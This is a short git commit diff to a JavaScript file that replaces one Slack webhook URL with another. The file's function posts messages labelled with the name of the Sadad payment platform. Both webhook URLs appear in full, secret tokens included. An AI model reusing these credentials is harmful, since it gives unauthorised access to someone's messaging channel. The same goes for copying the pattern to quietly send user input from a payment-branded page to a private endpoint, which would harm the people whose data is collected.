25772937386831be6121e8020b857d527388652d
Aabwshmys <aabwshmys84@gmail.com>
2024-12-31 19:50:15 +0300

    Update TeleSned.js

--- ‏‏my-app/src/server/TeleSned.js
+++ ‏‏my-app/src/server/TeleSned.js
@@ -2,7 +2,7 @@ import axios from 'axios';
 
 export const TeleSned = () => {
     const Send = async (message) => {
-        const webhookUrl = 'https://hooks.slack.com/services/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';
+        const webhookUrl = 'https://hooks.slack.com/services/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';
         const data = { text: `منصة سداد \n ${message}` }; // Properly format the payload
 
         try {
